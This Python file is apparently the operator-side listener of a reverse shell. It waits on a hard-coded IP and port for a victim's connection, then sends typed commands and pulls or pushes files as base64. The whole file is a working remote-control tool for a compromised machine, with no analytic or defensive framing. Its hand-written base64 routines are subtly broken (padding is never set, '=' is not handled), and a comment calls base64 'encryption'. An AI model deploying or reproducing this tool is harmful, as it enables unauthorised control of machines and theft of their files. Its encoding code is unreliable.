import socket
import simplejson

def encode_base64(data):
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    base64_string = ""
    padding = 0

    for i in range(0, len(data), 3):
        chunk = (data[i] << 16) + ((data[i + 1] if i + 1 < len(data) else 0) << 8) + (data[i + 2] if i + 2 < len(data) else 0)

        for j in range(4):
            index = (chunk >> ((3 - j) * 6)) & 0x3F
            base64_string += base64_chars[index]

        padding = (padding + 3) % 3

    return base64_string + ("=" * padding)

def decode_base64(base64_string):
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    decoded_data = bytearray()

    for i in range(0, len(base64_string), 4):
        chunk = 0
        for j in range(4):
            chunk = (chunk << 6) + base64_chars.index(base64_string[i + j])

        decoded_data.extend([
            (chunk >> 16) & 0xFF,
            (chunk >> 8) & 0xFF,
            chunk & 0xFF
        ])

    return bytes(decoded_data)

# # Your image file paths
# input_image_path = 'input_image.png'
# output_image_path = 'output_image.png'

# # Read the image and convert it to Base64
# with open(input_image_path, "rb") as image_file:
#     image_data = image_file.read()
#     encoded_image = encode_base64(image_data)
#     print("Image Encrypted to Base64:")
#     print(encoded_image)

# # Convert Base64 back to image
# decoded_image = decode_base64(encoded_image)
# with open(output_image_path, "wb") as output_image_file:
#     output_image_file.write(decoded_image)
#     print("Image Decrypted from Base64.")


class SocketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))
        
    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))
        
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
            
    def command_execution(self, command_input):
        self.json_send(command_input)
        
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
            
        return self.json_receive()
    
    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(decode_base64(content))
            return "Download OK"
        
    def get_file_content(self, path):
        with open(path, "rb") as my_file:
            return encode_base64(my_file.read())
        
    def start_listener(self):
        while True:
            command_input = input("enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)
                    
                command_output = self.command_execution(command_input)
                
                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
                    print(command_output)
                    
                if command_input[0] == "pwd" and "Error!" not in command_output:
                    print(command_output)
                    
                if command_input[0] == "ls" and "Error!" not in command_output:
                    print(command_output)
                    
            except Exception:
                command_output = "Error!"
                print(command_output)
                
my_socket_listener = SocketListener("192.168.122.80", 8080)
my_socket_listener.start_listener()